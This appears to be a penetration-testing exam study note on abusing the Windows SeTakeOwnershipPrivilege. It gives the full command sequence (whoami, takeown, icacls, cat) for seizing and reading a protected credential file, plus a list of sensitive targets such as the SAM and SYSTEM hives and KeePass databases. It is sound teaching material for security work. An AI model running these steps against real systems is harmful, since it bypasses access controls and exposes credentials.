# **SeTakeOwnershipPrivilege**

## **Overview**

- Grants the ability to **take ownership of any securable Windows object**.
- Applies to:
  - NTFS files and folders
  - Active Directory objects
  - Registry keys
  - Printers, services, and processes
- Assigns `WRITE_OWNER` rights, allowing the user to change an object's owner.
- Administrators have this privilege by default.
- Can be abused for **Privilege Escalation and Sensitive Data Access**.

**Exam Tip:** A service account with `SeTakeOwnershipPrivilege` may provide a privilege escalation opportunity without requiring local administrator rights.

## **Enumeration**

Check the current user's privileges:

```
whoami /priv
```

Look for:

```
SeTakeOwnershipPrivilege    Take ownership of files or other objects    Disabled
```

## **Enable SeTakeOwnershipPrivilege**

If the privilege is disabled, enable it using the EnableAllTokenPrivs script.

```
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

Verify:

```
whoami /priv
```

Expected:

```
SeTakeOwnershipPrivilege    Enabled
```

## **Exploitation – Taking Ownership of a File**

**Scenario:** A user can list files in a restricted directory but cannot read sensitive files such as `cred.txt`.

### **1. Identify Target File**

```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' |
Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}
```

### **2. Check Directory Ownership**

```
dir /q "C:\Department Shares\Private\IT"
```

### **3. Take Ownership**

Use `takeown`:

```
takeown /f "C:\Department Shares\Private\IT\cred.txt"
```

### **4. Verify Ownership**

```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' |
Select name,directory,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}
```

### **5. Modify File ACL**

Taking ownership does **NOT automatically grant read access**.

Grant the current user Full Control:

```
icacls "C:\Department Shares\Private\IT\cred.txt" /grant htb-student:F
```

### **6. Read the File**

```
cat "C:\Department Shares\Private\IT\cred.txt"
```

Key Exam Takeaway

**SeTakeOwnershipPrivilege → takeown → icacls → Read sensitive file**

## **Important Commands – Quick Reference**

| Command                     | Purpose                         |
| --------------------------- | ------------------------------- |
| `whoami /priv`              | Enumerate user privileges       |
| `takeown /f file`           | Take ownership of a file        |
| `dir /q folder`             | Check file/folder ownership     |
| `Get-Acl file`              | View file permissions and owner |
| `icacls file /grant user:F` | Grant Full Control              |
| `cat file`                  | Read file contents              |

## **Potential Targets**

Look for sensitive files that may contain credentials or secrets:

| File / Location                    | Purpose                        |
| ---------------------------------- | ------------------------------ |
| `C:\inetpub\wwwroot\web.config`    | IIS configuration              |
| `%WINDIR%\repair\sam`              | SAM database                   |
| `%WINDIR%\repair\system`           | SYSTEM registry hive           |
| `%WINDIR%\repair\software`         | SOFTWARE registry hive         |
| `%WINDIR%\repair\security`         | SECURITY registry hive         |
| `%WINDIR%\system32\config\*.sav`   | Registry backup files          |
| `*.kdbx`                           | KeePass databases              |
| `passwords.*`, `pass.*`, `creds.*` | Potential credentials          |
| `*.ps1`, configuration files       | Possible hardcoded credentials |

## **Important Notes**

- Ownership and file permissions (ACLs) are different.
- Taking ownership does not automatically grant read access.
- Use `icacls` to modify permissions after taking ownership.
- Can also be assigned through GPO abuse using **SharpGPOAbuse**.
- Changing ownership or ACLs can disrupt applications and users.
- Always restore original ownership and permissions after testing.
- Document changes if restoration is not possible.

## **Exam Workflow**

```
1. whoami /priv
        |
2. Identify SeTakeOwnershipPrivilege
        |
3. Enable privilege if disabled
        |
4. Identify interesting target file
        |
5. takeown /f <file>
        |
6. icacls <file> /grant <user>:F
        |
7. Read sensitive file
        |
8. Restore original permissions/ownership
```

**Remember:** `SeTakeOwnershipPrivilege` is useful when you can access a directory but cannot read its protected files.
